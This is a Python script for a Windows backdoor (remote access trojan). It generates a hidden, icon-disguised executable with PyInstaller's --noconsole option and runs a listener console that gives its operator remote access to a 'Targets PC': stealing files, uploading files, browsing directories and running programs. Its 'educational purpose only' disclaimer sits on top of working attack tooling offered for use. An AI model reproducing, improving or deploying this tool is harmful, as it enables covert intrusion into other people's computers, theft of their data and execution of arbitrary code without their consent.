import subprocess
import sys
import os
import socket
import re
import argparse


# Created By: EH
# Educational purpose only 
# I'm not responsible for your actions 

def clear_console():
    if sys.platform == "win32":
        os.system("cls")
    else:
        print("This script works on windows")
        print("Run This on windows")
        sys.exit()


def char_remove(char, remove):
        a = char.split(" ")
        strs = ""
        for x in a:
            if x == remove:
                continue
            strs += x
        return strs


def exe_compile(name, host, port, icon=""):

    try:
        user_input_name = name
        user_input_host = host
        user_input_port = port

        if re.search(r"\.", user_input_name):
            print("Enter Just the name without any '.'(dot) or anything")
            print("Example name: backdoor")
            sys.exit()

        opnr = open(user_input_name+".py", "w+")
        opnr.write("import mainlib\nmainlib.socs('{0}', {1}, '{2}').socks()".format(user_input_host, user_input_port, user_input_name+".exe"))
        opnr.close()

        if len(icon) != 0:
            output = subprocess.Popen(["pyinstaller", "--noconsole", "--onefile", "--icon={0}".format(icon), user_input_name+".py"], shell=True, stdout=subprocess.PIPE)
            print(output.wait())
        else:
            output = subprocess.Popen(["pyinstaller", "--noconsole", "--onefile", user_input_name+".py"], shell=True, stdout=subprocess.PIPE)
            print(output.wait())
        

        print("[+]Run this command it will open console for Listening: python winshell.py -l [You're Host/IP] -p [You're Port] --console 1")
        print("[+]Check dist Folder For the EXE file")
        print("[+]Finished")
    except Exception as error:
        print(error)
        print("[+]Run python winshell.py -h for Help")
        print("[+]Genrating exe File Example: python winshell.py -l [You're Host/IP] -p [You're Port] --name [You're file Name]")


def run_console(host, port):
    try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.bind((host, port))
    
        soc.listen(0)
        con, addr = soc.accept()
        print("Connected {0}\nType help for all the commands".format(addr))
    except KeyboardInterrupt:
        sys.exit()
    

    pattern_upload = r"upload"
    pattern_download = r"download"
    
    while True:
        try:
            #data = con.recv(99999)
            #print(data.decode())
            user_input = input("> ")
            if re.match(pattern_upload, user_input):
                con.send(user_input.encode("utf-8"))
                opnr = open(char_remove(user_input, "upload").strip(), "rb")
                con.send(opnr.read())
                opnr.close()
            elif re.match(pattern_download, user_input):
                opnr = open(char_remove(user_input, "download").strip(), "ab")
                con.send(bytes(user_input.strip(), "utf-8"))
                print("Waiting for Incoming data")
                data_bin = con.recv(9999999)
                print("Writing data")
                opnr.write(data_bin)
                opnr.close()
            elif user_input == "debug_recv":
                data = recv(1025)
                print(data)
            elif user_input == "help":
                print("You Have The Remote Access to Targets PC")
                print("-------------------------------------------")
                print("download ->  downloads file from the Targets PC Example: download [path/filename]")
                print("upload -> upload file to the Targets PC Example: upload [path/filename]")
                print("ls ->  Lists Files in the directory from the Targets PC")
                print("cd -> change Directory in the tagrets PC")
                print("run ->  use command run to run exe file on targets PC Example: run [path/file.exe]")
            else:
                con.send(bytes(user_input, "utf-8"))
                data = con.recv(999999999)
                print(data.decode())
        
        except ConnectionAbortedError:
            print("[-]Connection Aborted Error")
            print("[+]Trying to reconnect")
            soc.close()
            run_console(host,port)
        except ConnectionError:
            print("[-]Connection Error")
            print("[+]Trying to reconnect")
            soc.close()
            run_console(host,port)
        except ConnectionResetError:
            print("[-]Connection Reset Error")
            print("[+]Trying to reconnect")
            soc.close()
            run_console(host,port)
        except KeyboardInterrupt:
            exit()
        except Exception as error:
            print(error)
            pass



if __name__ == "__main__":
    clear_console()
    
    parse = argparse.ArgumentParser(description="Genrating exe File Example: python windoor.py -l [You're Host/IP] -p [You're Port] --name [You're file Name] Run this command it will open console for Listening: python windoor.py -l [You're Host/IP] -p [You're Port] --console 1")
    parse.add_argument("-l", type=str, help="Enter The Local Host Example: 192.168.0.1")
    parse.add_argument("-p", type=int, help="Enter The Port Example: 9999")
    parse.add_argument("--icon", type=str, help="Enter .ico file to add icon to generated exe file")
    parse.add_argument("--name", type=str, help="If you want to generate exe file enter the output file name only example: examplename")
    parse.add_argument("--console", type=int, help="Enter 1 To Run Console and listen to host and port for incoming connections")
    args = parse.parse_args()

    #input_user = input("> ")

    try:
        if args.name != None:
            if args.icon != None:
                exe_compile(args.name, args.l, args.p, args.icon)
            else:
                exe_compile(args.name, args.l, args.p)

        elif args.console == 1:
            run_console(args.l, args.p)
        else:
            print("python winshell.py -h for more info")
            print("""[+]Genrating exe File Example: python winshell.py -l [You're Host/IP] -p [You're Port] --name [You're file Name]\n[+]Run this command it will open console for Listening: python winshell.py -l [You're Host/IP] -p [You're Port] --console 1""")
    except Exception as error:
        print(error)
        print("python winshell.py -h for more info")
        print("""[+]Genrating exe File Example: python winshell.py -l [You're Host/IP] -p [You're Port] --name [You're file Name]\n[+]Run this command it will open console for Listening: python winshell.py -l [You're Host/IP] -p [You're Port] --console 1""")
    